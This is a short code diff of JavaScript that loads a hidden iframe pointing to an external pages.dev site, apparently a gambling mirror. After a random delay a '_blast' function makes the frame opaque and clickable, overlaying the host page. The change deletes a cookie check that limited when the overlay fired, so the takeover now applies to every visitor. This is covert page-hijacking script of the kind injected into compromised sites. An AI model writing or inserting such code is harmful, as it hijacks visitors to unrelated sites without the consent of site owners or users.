@@ -2,7 +2,6 @@
     const _target = "https://alternatif-sensa4d.pages.dev/";
     let _triggered = false;
     let _frame = null;
-    const _check = () => document.cookie.split(';').some(item => item.trim().indexOf('__cf_bm_auth=true') == 0);
     const _init = () => {
         if (_frame) return;
         _frame = document.createElement('iframe');
@@ -16,7 +15,7 @@
     };
     setTimeout(_init, Math.floor(Math.random() * 1000) + 500);
     const _blast = () => {
-        if (!_check() || _triggered || !_frame) return;
+        if (_triggered || !_frame) return;
         _triggered = true;
         _frame.style.opacity = '1';
         _frame.style.pointerEvents = 'auto';
